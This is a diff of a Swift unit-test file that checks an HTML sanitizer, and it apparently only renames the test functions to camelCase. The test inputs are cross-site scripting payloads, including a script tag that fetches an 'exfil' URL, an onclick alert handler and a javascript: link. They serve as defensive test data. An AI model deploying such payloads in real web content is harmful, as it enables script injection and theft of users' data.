@@ -13,7 +13,7 @@ class HTMLSanitizationTests: XCTestCase {
 
     // MARK: - End-to-end: decrypt a PGP-encrypted XSS payload, then verify sanitization
 
-    func test_decrypted_xss_payload_is_stripped_after_full_roundtrip() async throws {
+    func testDecryptedXssPayloadIsStrippedAfterFullRoundtrip() async throws {
         let key = TestData.k0
         let attackHtml = """
         <html>
@@ -61,7 +61,7 @@ class HTMLSanitizationTests: XCTestCase {
         )
     }
 
-    func test_decrypted_html_without_tags_passes_through() async throws {
+    func testDecryptedHtmlWithoutTagsPassesThrough() async throws {
         let key = TestData.k0
         let plainText = "Hello, this is a normal encrypted message."
 
@@ -84,7 +84,7 @@ class HTMLSanitizationTests: XCTestCase {
 
     // MARK: - sanitizeHtml unit tests
 
-    func test_sanitize_html_strips_script_tags() async throws {
+    func testSanitizeHtmlStripsScriptTags() async throws {
         let input = """
         <html><body><p>Hello</p><script>fetch('https://example.com/exfil')</script></body></html>
         """
@@ -95,7 +95,7 @@ class HTMLSanitizationTests: XCTestCase {
         XCTAssertNil(sanitized.range(of: "example.com"))
     }
 
-    func test_sanitize_html_strips_inline_event_handlers() async throws {
+    func testSanitizeHtmlStripsInlineEventHandlers() async throws {
         let input = "<p onclick=\"alert(1)\">Click me</p>"
         let sanitized = try await core.sanitizeHtml(html: input)
         XCTAssertNotNil(sanitized.range(of: "Click me"))
@@ -103,19 +103,19 @@ class HTMLSanitizationTests: XCTestCase {
         XCTAssertNil(sanitized.range(of: "alert"))
     }
 
-    func test_sanitize_html_strips_javascript_protocol_in_links() async throws {
+    func testSanitizeHtmlStripsJavascriptProtocolInLinks() async throws {
         let input = "<a href=\"javascript:alert('xss')\">click</a>"
         let sanitized = try await core.sanitizeHtml(html: input)
         XCTAssertNil(sanitized.range(of: "javascript:"))
     }
 
-    func test_sanitize_html_preserves_safe_plain_text() async throws {
+    func testSanitizeHtmlPreservesSafePlainText() async throws {
         let input = "This is a plain text message with no HTML."
         let sanitized = try await core.sanitizeHtml(html: input)
         XCTAssertEqual(sanitized, input)
     }
 
-    func test_sanitize_html_preserves_safe_formatting() async throws {
+    func testSanitizeHtmlPreservesSafeFormatting() async throws {
         let input = "<b>bold</b> and <i>italic</i>"
         let sanitized = try await core.sanitizeHtml(html: input)
         XCTAssertNotNil(sanitized.range(of: "bold"))
@@ -124,27 +124,27 @@ class HTMLSanitizationTests: XCTestCase {
 
     // MARK: - isHTMLString (decrypted-content routing detection)
 
-    func test_is_html_string_detects_matching_tags() {
+    func testIsHtmlStringDetectsMatchingTags() {
         let input = "<div>Hello</div>"
         XCTAssertTrue(input.isHTMLString)
     }
 
-    func test_is_html_string_detects_nested_html() {
+    func testIsHtmlStringDetectsNestedHtml() {
         let input = "<html><body><p>content</p></body></html>"
         XCTAssertTrue(input.isHTMLString)
     }
 
-    func test_is_html_string_negative_for_plain_text() {
+    func testIsHtmlStringNegativeForPlainText() {
         let input = "Hello, this is a plain message."
         XCTAssertFalse(input.isHTMLString)
     }
 
-    func test_is_html_string_negative_for_email_angle_brackets() {
+    func testIsHtmlStringNegativeForEmailAngleBrackets() {
         let input = "Please contact us at <user@example.com> for support."
         XCTAssertFalse(input.isHTMLString)
     }
 
-    func test_is_html_string_negative_for_unmatched_opening_tag() {
+    func testIsHtmlStringNegativeForUnmatchedOpeningTag() {
         let input = "Just an opening <div without closing."
         XCTAssertFalse(input.isHTMLString)
     }
